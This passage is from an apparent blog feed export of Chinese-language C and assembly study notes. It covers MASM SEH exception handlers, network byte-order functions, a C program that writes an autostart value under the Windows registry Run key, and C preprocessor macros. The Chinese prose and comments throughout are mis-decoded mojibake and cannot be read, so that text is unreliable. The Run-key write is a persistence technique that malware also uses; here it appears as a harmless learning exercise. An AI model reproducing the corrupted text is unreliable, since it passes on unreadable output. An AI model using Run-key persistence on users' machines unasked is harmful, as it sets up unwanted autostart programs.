Handlerï¼Œä¸å¤„ç†å¼‚å¸¸</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Handler2	proc	_lpExceptionRecord,_lpSEH,_lpContext,_lpDispatcherContext</span><br><span class="line">		local	@szBuffer[<span class="number">256</span>]:byte</span><br><span class="line"></span><br><span class="line">		pushad</span><br><span class="line">		mov	esi,_lpExceptionRecord</span><br><span class="line">		mov	edi,_lpContext</span><br><span class="line">		assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT</span><br><span class="line">		invoke	wsprintf,addr @szBuffer,addr szMsg2,\</span><br><span class="line">			[edi].regEip,[esi].ExceptionCode,[esi].ExceptionFlags</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr @szBuffer,<span class="literal">NULL</span>,MB_OK</span><br><span class="line">		assume	esi:nothing,edi:nothing</span><br><span class="line">		popad</span><br><span class="line">		mov	eax,ExceptionContinueSearch</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Handler2	endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test2		proc</span><br><span class="line"></span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler2</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">;********************************************************************</span><br><span class="line">; ä¼šå¼•å‘å¼‚å¸¸çš„æŒ‡ä»¤</span><br><span class="line">;********************************************************************</span><br><span class="line">		pushad</span><br><span class="line">		xor	eax,eax</span><br><span class="line">		mov	dword ptr [eax],<span class="number">0</span></span><br><span class="line">		popad		;è¿™ä¸€å¥å°†æ— æ³•è¢«æ‰§è¡Œ</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe2,addr szCaption,MB_OK</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">8</span></span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test2		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">_Test1		proc</span><br><span class="line"></span><br><span class="line">		assume	fs:nothing</span><br><span class="line">		push	offset _SafePlace</span><br><span class="line">		push	offset _Handler1</span><br><span class="line">		push	fs:[<span class="number">0</span>]</span><br><span class="line">		mov	fs:[<span class="number">0</span>],esp</span><br><span class="line">		invoke	_Test2</span><br><span class="line">_SafePlace:</span><br><span class="line">		invoke	MessageBox,<span class="literal">NULL</span>,addr szSafe1,addr szCaption,MB_OK</span><br><span class="line">		pop	fs:[<span class="number">0</span>]</span><br><span class="line">		add	esp,<span class="number">8</span></span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">_Test1		endp</span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">start:</span><br><span class="line">		invoke	_Test1</span><br><span class="line">		invoke	ExitProcess,<span class="literal">NULL</span></span><br><span class="line">;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">		end	start</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-12.png" alt="img"> </p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.cnblogs.com/Rev-omi/p/13893547.html">https://www.cnblogs.com/Rev-omi/p/13893547.html</a></p>
<p><a href="https://bbs.pediy.com/thread-273332.htm#msg_header_h3_0">https://bbs.pediy.com/thread-273332.htm</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-09_socketç¼–ç¨‹</title>
    <url>/posts/3ced1fa4/</url>
    <content><![CDATA[<p>åœ¨ç½‘ç»œä¸Šä¸ºå¤§ç«¯å­˜å‚¨</p>
<p>lpString </p>
<p>htons()â€“â€Host to Network Shortâ€</p>
<p>htonl()â€“â€Host to Network Longâ€</p>
<p>ntohs()â€“â€Network to Host Shortâ€</p>
<p>ntohl()â€“â€Network to Host Longâ€</p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-08_æ³¨å†Œè¡¨è¯»å†™</title>
    <url>/posts/f42908ab/</url>
    <content><![CDATA[<p>32ä½ä¸‹ ä¿®æ”¹æ³¨å†Œè¡¨ï¼ˆç¼–è¯‘åéœ€è¦ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰§è¡Œ  æˆ–è€…å…ˆè¿›è¡Œææƒï¼‰</p>
<p>ç”±äºæ˜¯32ä½çš„ æ‰€ä»¥å¹¶ä¸ä¼šå†™å…¥åˆ° <code>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> è€Œæ˜¯å†™å…¥åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</span><br></pre></td></tr></table></figure>

<p><code>WOW6432Node</code> ä¸‹å­˜æ”¾åœ¨32ä½ç¨‹åºçš„æ³¨å†Œè¡¨å†…å®¹</p>
<p><img src="/posts/f42908ab/8-1.png" alt="img"></p>
<p><code>RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, 0, KEY_ALL_ACCESS|KEY_WOW64_32KEY, &amp;hkey)</code>   åœ¨win10è™šæ‹Ÿæœºå°è¯•æ˜¯ å‘ç°è¿˜æ˜¯å†™å…¥åˆ°32ä½ä¸‹çš„æ³¨å†Œè¡¨ä¸­  win7æ²¡æˆåŠŸã€‚ã€‚  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	HKEY hkey;</span><br><span class="line">	LPCTSTR reg_path = <span class="string">&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (ERROR_SUCCESS !=  RegOpenKeyEx(HKEY_LOCAL_MACHINE, reg_path, <span class="number">0</span>, KEY_ALL_ACCESS, &amp;hkey)) &#123;</span><br><span class="line">		GetLastError();   <span class="comment">//è¿”å›åœ¨eax</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*	_asm &#123;</span></span><br><span class="line"><span class="comment">			push eax</span></span><br><span class="line"><span class="comment">			call printf</span></span><br><span class="line"><span class="comment">			add esp,4</span></span><br><span class="line"><span class="comment">		&#125;*/</span></span><br><span class="line">		<span class="comment">//printf(&quot;123&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(ERROR_SUCCESS != RegSetValueEx(hkey, <span class="string">&quot;aaaaaaaaa&quot;</span>, <span class="number">0</span>, REG_SZ, <span class="string">&quot;C:\\AsmDEMO.exe&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;C:\\AsmDEMO.exe&quot;</span>) + <span class="number">1</span>)) &#123;</span><br><span class="line">		RegCloseKey(hkey);</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="comment">//printf(&quot;456&quot;);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RegCloseKey(hkey);</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&quot;è®¾ç½®æˆåŠŸ&quot;</span>,MB_OK);</span><br><span class="line">	<span class="comment">//printf(&quot;112&quot;);</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/f42908ab/8-2.png" alt="img"></p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.codenong.com/44199379/">https://www.codenong.com/44199379/</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-07_å†…è”å‡½æ•°</title>
    <url>/posts/7fd9f7c4/</url>
    <content><![CDATA[<p>ä½¿ç”¨ gcc æŸ¥çœ‹æ­£å¸¸ä¸‹å’Œ ä½¿ç”¨å†…è”çš„åŒºåˆ«   gcc -E -O xxxx.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> echo(n) printf(<span class="string">&quot;%d\n&quot;</span>,n);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> hello() printf(<span class="string">&quot;helloworld!\n&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> test() &#123; printf(<span class="string">&quot;123&quot;</span>);\</span></span><br><span class="line"><span class="meta">				 printf(<span class="string">&quot;456&quot;</span>);\</span></span><br><span class="line"><span class="meta">				 printf(<span class="string">&quot;789\n&quot;</span>); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> f(x) f##x();   <span class="comment">//f##x   f1()</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">f1</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;f1\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f2</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;f2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	echo(<span class="number">23</span>)  <span class="comment">// ;å¯åŠ å¯ä¸åŠ </span></span><br><span class="line">	hello()</span><br><span class="line">	f(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aaaaa 110</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> aaaaa == 10</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;BBBB&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> aaaaa</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;aaaa\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// aaaaa</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>#pragma once </code>  åªåŒ…å«ä¸€æ¬¡</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> n 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> n == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> é™¤æ•°ä¸èƒ½ä¸º0   <span class="comment">// ä¼šè¿”å›ä¸€ä¸ªerror</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> n 0 </span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> n == 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message ï¼ˆ<span class="string">&quot;é™¤æ•°ä¸èƒ½ä¸º0&quot;</span>ï¼‰</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>





<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">é¦–å…ˆä¸‰ç§å½¢å¼çš„å‘½ä»¤ï¼šå®å®šä¹‰ï¼Œæ–‡ä»¶åŒ…å«ï¼Œæ¡ä»¶ç¼–è¯‘å‘½ä»¤ã€‚</span><br><span class="line"><span class="number">1</span>ã€å®å®šä¹‰ä¸»è¦æ˜¯ï¼š<span class="meta">#<span class="keyword">define</span>ï¼Œ#<span class="keyword">undef</span></span></span><br><span class="line">å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PI 3.1415926                    <span class="comment">/*ä¸å¸¦å‚æ•°çš„å®å®šä¹‰*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Max(a,b)  a&gt;b?a:b                    <span class="comment">/*å¸¦å‚æ•°çš„å®å®šä¹‰*/</span></span></span><br><span class="line">è¯´æ˜ï¼šå®å®šä¹‰åœ¨Cè¯­è¨€ä¸C++è¯­è¨€ä¸­æ˜¯ç›¸é€šçš„ã€‚</span><br><span class="line">ä¸‹é¢ä¸¾ä¾‹è¯´æ˜å®šä¹‰å®FAILEDç”¨äºæ£€æµ‹æ•°æ®çš„æ­£ç¡®æ€§ã€‚</span><br><span class="line">â‘ <span class="meta">#<span class="keyword">define</span>çš„åº”ç”¨ï¼š</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAILED(Status) ((Status)&lt;0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> d;</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">&quot;Please input a integer number(n&gt;0)/n&quot;</span>);</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span> ,&amp;d);</span><br><span class="line">&#125;<span class="keyword">while</span>(FAILED(d));</span><br><span class="line">&#125; </span><br><span class="line">å…¶ä¸­<span class="keyword">while</span>(FAILED(d))åœ¨ç¼–è¯‘ä¹‹å‰è¢«æ— æ¡ä»¶æ›¿æ¢ä¸º<span class="keyword">while</span>(d&lt;<span class="number">0</span>)ã€‚ </span><br><span class="line">å®å®šä¹‰å’Œè°ƒç”¨åœ¨å½¢å¼ä¸å‡½æ•°æ¯”è¾ƒç›¸ä¼¼ï¼Œä½†æ˜¯åŸç†æ˜¯ä¸åŒã€‚</span><br><span class="line">â‘¡<span class="meta">#<span class="keyword">undef</span>çš„åº”ç”¨ï¼š</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1); <span class="comment">/*é”™è¯¯ï¼ŒCONST_NAME1çš„å®šä¹‰å·²ç»å–æ¶ˆ*/</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">åœ¨ç¨‹åºçš„ç¼–è¯‘çš„æ—¶å€™ï¼Œç³»ç»Ÿæç¤ºå¦‚ä¸‹ä¿¡æ¯</span><br><span class="line">error C2065: <span class="string">&#x27;CONST_NAME1&#x27;</span> : undeclared identifier</span><br><span class="line">å‡ºç°ä¸Šè¿°ç¼–è¯‘é”™è¯¯çš„åŸå› æ˜¯ï¼Œåœ¨ç¬¬äºŒæ¬¡åº”ç”¨ç¬¦å·å¸¸é‡CONST_NAME1æ—¶ï¼Œæ­¤ç¬¦å·å¸¸é‡å·²ç»è¢«å–æ¶ˆå®šä¹‰ã€‚</span><br><span class="line"><span class="number">2</span>ã€æ–‡ä»¶åŒ…å«ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;æ–‡ä»¶å&gt;</span> ï¼Œè¿™ç§å±äºæ ‡å‡†æ–¹å¼ï¼Œç”¨äºç¼–è¯‘ç³»ç»ŸæŒ‡å®šçš„æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> â€œæ–‡ä»¶åâ€ï¼Œè¿™ç§å±äºç”¨æˆ·æ–¹å¼ï¼ŒæŸ¥æ‰¾ç”¨æˆ·å½“å‰å·¥ä½œçš„æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å†æŒ‰ç…§æ ‡å‡†æ–¹å¼æŸ¥è¯¢ã€‚</span></span><br><span class="line"><span class="number">3</span>ã€æ¡ä»¶ç¼–è¯‘ï¼ˆå¸¸è§çš„ä¸‰ç§å½¢å¼ï¼‰ï¼š</span><br><span class="line">â‘ ç¬¬ä¸€ç§å½¢å¼ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(æˆ–è€…æ˜¯<span class="keyword">ifdef</span>)<span class="string">&lt;æ ‡è¯†ç¬¦&gt;</span></span></span><br><span class="line">&lt;ç¨‹åºæ®µ<span class="number">1</span>&gt;</span><br><span class="line">[<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">&lt;ç¨‹åºæ®µ<span class="number">2</span>&gt;]</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">â‘¡ç¬¬äºŒç§å½¢å¼ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> !defined(æˆ–è€…æ˜¯<span class="keyword">ifndef</span>)<span class="string">&lt;æ ‡è¯†ç¬¦&gt;</span></span></span><br><span class="line">&lt;ç¨‹åºæ®µ<span class="number">1</span>&gt;</span><br><span class="line">[<span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">&lt;ç¨‹åºæ®µ<span class="number">2</span>&gt;]</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">â‘¢ç¬¬ä¸‰ç§å½¢å¼å¸¸ç”¨ä¸C++ç¼–è¯‘å™¨ä¸­ã€‚</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> â€¦</span></span><br><span class="line">[<span class="meta">#<span class="keyword">elif</span> â€¦ ]</span></span><br><span class="line">[<span class="meta">#<span class="keyword">elif</span> â€¦]</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> â€¦</span></span><br><span class="line"> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">4</span>ã€å…¶ä»–æ¡ä»¶ç¼–è¯‘å‘½ä»¤ï¼š</span><br><span class="line">â‘ <span class="meta">#<span class="keyword">error</span>:</span></span><br><span class="line">è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line"><span class="meta">#<span class="keyword">error</span> token-sequence</span></span><br><span class="line">å…¶ä¸»è¦çš„ä½œç”¨æ˜¯åœ¨ç¼–è¯‘çš„æ—¶å€™è¾“å‡ºç¼–è¯‘é”™è¯¯ä¿¡æ¯token-sequenceï¼Œä»æ–¹ä¾¿ç¨‹åºå‘˜æ£€æŸ¥ç¨‹åºä¸­å‡ºç°çš„é”™è¯¯ã€‚ä¾‹å¦‚ä¸‹é¢çš„ç¨‹åº</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME1 <span class="string">&quot;CONST_NAME1&quot;</span></span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME1);</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> No defined Constant Symbol CONST_NAME1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONST_NAME2 <span class="string">&quot;CONST_NAME2&quot;</span></span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">&#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s/n&quot;</span>,CONST_NAME2);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">åœ¨ç¼–è¯‘çš„æ—¶å€™è¾“å‡ºå¦‚ç¼–è¯‘ä¿¡æ¯</span><br><span class="line">fatal error C1189: <span class="meta">#<span class="keyword">error</span> : No defined Constant Symbol CONST_NAME1</span></span><br><span class="line">â‘¡<span class="meta"># <span class="keyword">pragma</span></span></span><br><span class="line">åœ¨ç¼–å†™ç¨‹åºçš„æ—¶å€™,æˆ‘ä»¬ç»å¸¸è¦ç”¨åˆ°<span class="meta">#<span class="keyword">pragma</span> æŒ‡ä»¤æ¥è®¾å®šç¼–è¯‘å™¨çš„çŠ¶æ€æˆ–è€…æ˜¯æŒ‡ç¤ºç¼–è¯‘å™¨å®Œæˆä¸€äº›ç‰¹å®šçš„åŠ¨ä½œ. </span></span><br><span class="line">ä¸‹é¢ä»‹ç»äº†ä¸€ä¸‹è¯¥æŒ‡ä»¤çš„ä¸€äº›å¸¸ç”¨å‚æ•°,å¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©!</span><br><span class="line">ä¸€èˆ¬æ ¼å¼ï¼š<span class="meta">#<span class="keyword">pragma</span> para </span></span><br><span class="line">ä¸€ã€  message å‚æ•°ã€‚ </span><br><span class="line">message </span><br><span class="line">å®ƒèƒ½å¤Ÿåœ¨ç¼–è¯‘ä¿¡æ¯è¾“å‡ºçª— </span><br><span class="line">å£ä¸­è¾“å‡ºç›¸åº”çš„ä¿¡æ¯ï¼Œè¿™å¯¹äºæºä»£ç ä¿¡æ¯çš„æ§åˆ¶æ˜¯éå¸¸é‡è¦çš„ã€‚å…¶ä½¿ç”¨æ–¹æ³•ä¸ºï¼š </span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message(â€œæ¶ˆæ¯æ–‡æœ¬â€) </span></span><br><span class="line">å½“ç¼–è¯‘å™¨é‡åˆ°è¿™æ¡æŒ‡ä»¤æ—¶å°±åœ¨ç¼–è¯‘è¾“å‡ºçª—å£ä¸­å°†æ¶ˆæ¯æ–‡æœ¬æ‰“å°å‡ºæ¥ã€‚ </span><br><span class="line">å½“æˆ‘ä»¬åœ¨ç¨‹åºä¸­å®šä¹‰äº†è®¸å¤šå®æ¥æ§åˆ¶æºä»£ç ç‰ˆæœ¬çš„æ—¶å€™ï¼Œæˆ‘ä»¬è‡ªå·±æœ‰å¯èƒ½éƒ½ä¼šå¿˜è®°æœ‰æ²¡æœ‰æ­£ç¡®çš„è®¾ç½®è¿™äº›å®ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨è¿™æ¡ </span><br><span class="line">æŒ‡ä»¤åœ¨ç¼–è¯‘çš„æ—¶å€™å°±è¿›è¡Œæ£€æŸ¥ã€‚å‡è®¾æˆ‘ä»¬å¸Œæœ›åˆ¤æ–­è‡ªå·±æœ‰æ²¡æœ‰åœ¨æºä»£ç çš„ä»€ä¹ˆåœ°æ–¹å®šä¹‰äº†_X86è¿™ä¸ªå®å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³• </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _X86 </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> message(â€œ_X86 macro activated!â€) </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br><span class="line">å½“æˆ‘ä»¬å®šä¹‰äº†_X86è¿™ä¸ªå®ä»¥åï¼Œåº”ç”¨ç¨‹åºåœ¨ç¼–è¯‘æ—¶å°±ä¼šåœ¨ç¼–è¯‘è¾“å‡ºçª—å£é‡Œæ˜¾ç¤ºâ€œ_ </span><br><span class="line">X86 macro activated!â€ã€‚æˆ‘ä»¬å°±ä¸ä¼šå› ä¸ºä¸è®°å¾—è‡ªå·±å®šä¹‰çš„ä¸€äº›ç‰¹å®šçš„å®è€ŒæŠ“è€³æŒ è…®äº† </span><br><span class="line">äºŒã€  å¦ä¸€ä¸ªä½¿ç”¨å¾—æ¯”è¾ƒå¤šçš„<span class="meta">#<span class="keyword">pragma</span>å‚æ•°æ˜¯code_segï¼Œé©±åŠ¨å¼€å‘ä½¿ç”¨æ¯”è¾ƒå¤šï¼Œåº”ç”¨ç”¨ä¸åˆ°ã€‚æ ¼å¼å¦‚ï¼š </span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> code_seg( [ [ &#123; push | pop&#125;, ] [ identifier, ] ] [ <span class="string">&quot;segment-name&quot;</span> [, <span class="string">&quot;segment-class&quot;</span> ] ) </span></span><br><span class="line">è¯¥æŒ‡ä»¤ç”¨æ¥æŒ‡å®šå‡½æ•°åœ¨.objæ–‡ä»¶ä¸­å­˜æ”¾çš„èŠ‚,è§‚å¯ŸOBJæ–‡ä»¶å¯ä»¥ä½¿ç”¨VCè‡ªå¸¦çš„dumpbinå‘½ä»¤è¡Œç¨‹åº,å‡½æ•°åœ¨.objæ–‡ä»¶ä¸­é»˜è®¤çš„å­˜æ”¾èŠ‚ </span><br><span class="line">ä¸º.textèŠ‚ </span><br><span class="line">å¦‚æœcode_segæ²¡æœ‰å¸¦å‚æ•°çš„è¯,åˆ™å‡½æ•°å­˜æ”¾åœ¨.textèŠ‚ä¸­ </span><br><span class="line">push (å¯é€‰å‚æ•°) 